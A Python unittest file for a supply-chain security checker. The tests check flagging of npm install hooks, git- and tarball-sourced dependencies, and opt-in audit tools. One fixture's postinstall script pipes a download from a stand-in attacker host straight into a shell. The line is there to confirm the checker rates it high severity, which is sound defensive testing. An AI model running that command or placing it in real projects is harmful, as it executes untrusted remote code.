import json
import os
import tempfile
import unittest
from unittest import mock

from asa import manifest as manifest_mod
from asa.checkers import supply_chain as sc_checker


def write(path, content=""):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as fh:
        fh.write(content)


def run_sc(root, context=None):
    m = manifest_mod.build(root)
    return sc_checker.run(m, root, context)


class TestActivation(unittest.TestCase):
    def test_does_not_activate_without_manifest(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "README.md"), "hi\n")
            m = manifest_mod.build(root)
            self.assertFalse(sc_checker.activates(m))

    def test_activates_on_node_project(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), "{}")
            m = manifest_mod.build(root)
            self.assertTrue(sc_checker.activates(m))


class TestLifecycleHooks(unittest.TestCase):
    def test_flags_nontrivial_postinstall(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "scripts": {"postinstall": "curl https://evil.example/x.sh | sh"}
            }))
            findings = run_sc(root)
            hits = [f for f in findings if f.check_id == "supply_chain.npm_install_lifecycle_hook"]
            self.assertEqual(len(hits), 1)
            self.assertEqual(hits[0].severity.value, "high")

    def test_trivial_echo_script_flagged_low(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "scripts": {"postinstall": "echo done"}
            }))
            findings = run_sc(root)
            hits = [f for f in findings if f.check_id == "supply_chain.npm_install_lifecycle_hook"]
            self.assertEqual(len(hits), 1)
            self.assertEqual(hits[0].severity.value, "low")

    def test_no_scripts_no_findings(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({"name": "x"}))
            findings = run_sc(root)
            hits = [f for f in findings if f.check_id == "supply_chain.npm_install_lifecycle_hook"]
            self.assertEqual(hits, [])

    def test_build_script_not_flagged(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "scripts": {"build": "tsc", "test": "jest"}
            }))
            findings = run_sc(root)
            hits = [f for f in findings if f.check_id == "supply_chain.npm_install_lifecycle_hook"]
            self.assertEqual(hits, [])

    def test_malformed_package_json_does_not_crash(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), "{not valid json")
            findings = run_sc(root)  # should not raise
            self.assertIsInstance(findings, list)


class TestGitAndTarballDeps(unittest.TestCase):
    def test_flags_git_dependency_in_package_json(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "dependencies": {"some-lib": "git+https://github.com/someone/some-lib.git#main"}
            }))
            findings = run_sc(root)
            ids = [f.check_id for f in findings]
            self.assertIn("supply_chain.dependency_from_git_or_tarball_url", ids)
            self.assertIn("supply_chain.forked_dependency_behind_upstream", ids)

    def test_registry_dependency_not_flagged(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "dependencies": {"express": "^4.18.0"}
            }))
            findings = run_sc(root)
            ids = [f.check_id for f in findings]
            self.assertNotIn("supply_chain.dependency_from_git_or_tarball_url", ids)

    def test_flags_git_url_in_requirements_txt(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "requirements.txt"), "requests==2.31.0\ngit+https://github.com/someone/somepkg.git@main#egg=somepkg\n")
            findings = run_sc(root)
            ids = [f.check_id for f in findings]
            self.assertIn("supply_chain.dependency_from_git_or_tarball_url", ids)

    def test_pinned_registry_requirements_not_flagged(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "requirements.txt"), "requests==2.31.0\nflask==3.0.0\n")
            findings = run_sc(root)
            ids = [f.check_id for f in findings]
            self.assertNotIn("supply_chain.dependency_from_git_or_tarball_url", ids)

    def test_no_duplicate_findings_for_same_url(self):
        with tempfile.TemporaryDirectory() as root:
            url = "git+https://github.com/someone/somepkg.git@main"
            write(os.path.join(root, "requirements.txt"), f"{url}#egg=somepkg\n")
            findings = run_sc(root)
            git_hits = [f for f in findings if f.check_id == "supply_chain.dependency_from_git_or_tarball_url"]
            self.assertEqual(len(git_hits), 1)


class TestAuditToolsOptIn(unittest.TestCase):
    def test_not_run_by_default(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({"name": "x"}))
            with mock.patch("subprocess.run") as mock_run:
                run_sc(root)  # no context passed
            mock_run.assert_not_called()

    def test_runs_when_opted_in(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({"name": "x"}))
            fake_output = json.dumps({"vulnerabilities": {"lodash": {"severity": "high"}}})
            with mock.patch("subprocess.run") as mock_run:
                mock_run.return_value = mock.Mock(returncode=0, stdout=fake_output, stderr="")
                findings = run_sc(root, context={"allow_audit_tools": True})
            mock_run.assert_called()
            hits = [f for f in findings if f.check_id == "supply_chain.npm_audit_findings"]
            self.assertEqual(len(hits), 1)
            self.assertEqual(hits[0].severity.value, "high")

    def test_audit_tool_missing_does_not_crash(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({"name": "x"}))
            with mock.patch("subprocess.run", side_effect=FileNotFoundError()):
                findings = run_sc(root, context={"allow_audit_tools": True})
            self.assertIsInstance(findings, list)


class TestCleanNoFalsePositives(unittest.TestCase):
    def test_clean_project_zero_findings(self):
        with tempfile.TemporaryDirectory() as root:
            write(os.path.join(root, "package.json"), json.dumps({
                "name": "x", "version": "1.0.0",
                "scripts": {"test": "jest", "build": "tsc"},
                "dependencies": {"express": "^4.18.0", "lodash": "4.17.21"},
            }))
            findings = run_sc(root)
            self.assertEqual(findings, [])


if __name__ == "__main__":
    unittest.main()
